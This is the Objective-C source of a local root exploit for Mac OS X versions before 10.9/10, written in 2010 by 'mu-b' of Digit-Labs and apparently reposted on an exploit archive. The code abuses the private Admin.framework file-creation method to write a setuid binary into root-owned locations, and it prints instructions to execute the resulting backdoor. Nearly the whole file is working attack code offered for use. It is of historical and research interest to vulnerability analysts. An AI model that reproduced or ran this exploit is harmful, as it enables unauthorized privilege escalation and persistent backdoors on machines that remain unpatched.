/* osx-irony-assist.m
 *
 * Copyright (c) 2010 by <mu-b@digit-labs.org>
 *
 * Apple MACOS X < 10.9/10? local root exploit
 * by mu-b - June 2010
 *
 * - Tested on: Apple MACOS X <= 10.8.X
 *
 * $Id: osx-irony-assist.m 16 2015-04-10 09:34:47Z mu-b $
 *
 * The most ironic backdoor perhaps in the history of backdoors.
 * Enabling 'Assistive Devices' in the 'Universal Access' preferences pane
 * uses this technique to drop a file ("/var/db/.AccessibilityAPIEnabled")
 * in a directory,
 *
 * drwxr-xr-x  62 root       wheel      2108  9 Apr 16:23 db
 *
 * without being root, now how did you do that?
 *
 * Copy what you want, wherever you want it, with whatever permissions you
 * desire, hmmm, backdoor?
 *
 * This is now fixed, so I guess this is OK :-)
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2010!@$!
 */
 
#include <stdio.h>
#include <stdlib.h>
 
#import <SecurityFoundation/SFAuthorization.h>
#import <Foundation/Foundation.h>
 
/* where you want to write it! */
#define BACKDOOR_BIN  "/var/db/.AccessibilityAPIEnabled"
 
int do_assistive_copy(const char *spath, const char *dpath)
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  id authenticatorInstance, *userUtilsInstance;
  Class authenticatorClass, userUtilsClass;
 
  (void) pool;
  NSBundle *adminBundle =
    [NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/Admin.framework"];
 
  authenticatorClass = [adminBundle classNamed:@"Authenticator"];
  if (!authenticatorClass)
    {
      fprintf (stderr, "* failed locating the Authenticator Class\n");
      return (EXIT_FAILURE);
    }
 
  printf ("* Found Authenticator Class!\n");
  authenticatorInstance =
    [authenticatorClass performSelector:@selector(sharedAuthenticator)];
 
  userUtilsClass = [adminBundle classNamed:@"UserUtilities"];
  if (!userUtilsClass)
    {
      fprintf (stderr, "* failed locating the UserUtilities Class\n");
      return (EXIT_FAILURE);
    }
 
  printf ("* found UserUtilities Class!\n");
  userUtilsInstance = (id *) [userUtilsClass alloc];
 
  SFAuthorization *authObj = [SFAuthorization authorization];
  OSStatus isAuthed = (OSStatus)
    [authenticatorInstance performSelector:@selector(authenticateUsingAuthorizationSync:)
                                withObject:authObj];
  printf ("* authenticateUsingAuthorizationSync:authObj returned: %i\n", isAuthed);
 
  NSData *suidBin =
    [NSData dataWithContentsOfFile:[NSString stringWithCString:spath
                                             encoding:NSASCIIStringEncoding]];
  if (!suidBin)
    {
      fprintf (stderr, "* could not create [NSDATA] suidBin!\n");
      return (EXIT_FAILURE);
    }
 
  NSDictionary *createFileWithContentsDict =
    [NSDictionary dictionaryWithObject:(id)[NSNumber numberWithShort:2377]
                                forKey:(id)NSFilePosixPermissions];
  if (!createFileWithContentsDict)
    {
      fprintf (stderr, "* could not create [NSDictionary] createFileWithContentsDict!\n");
      return (EXIT_FAILURE);
    }
 
  CFStringRef writePath =
    CFStringCreateWithCString(NULL, dpath, kCFStringEncodingMacRoman);
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wobjc-method-access"
  [*userUtilsInstance createFileWithContents:suidBin path:writePath
                                  attributes:createFileWithContentsDict];
#pragma clang diagnostic pop
  printf ("* now execute suid backdoor at %s\n", dpath);
 
  /* send the "Distributed Object Message" to the defaultCenter,
   * is this really necessary? (not for ownage)
   */
  [[NSDistributedNotificationCenter defaultCenter]
    postNotificationName:@"com.apple.accessibility.api"
    object:@"system.preferences" userInfo:nil
    deliverImmediately:YES];
 
  return (EXIT_SUCCESS);
}
 
int main (int argc, const char * argv[])
{
 
  printf ("Apple MACOS X < 10.9/10? local root exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2010!@$!\n\n");
 
  if (argc <= 1)
    {
      fprintf (stderr, "Usage: %s <source> [destination]\n", argv[0]);
      exit (EXIT_SUCCESS);
    }
 
  return (do_assistive_copy(argv[1], argc >= 2 ? argv[2] : BACKDOOR_BIN));
}

# milw00rm.org [2015-04-21]

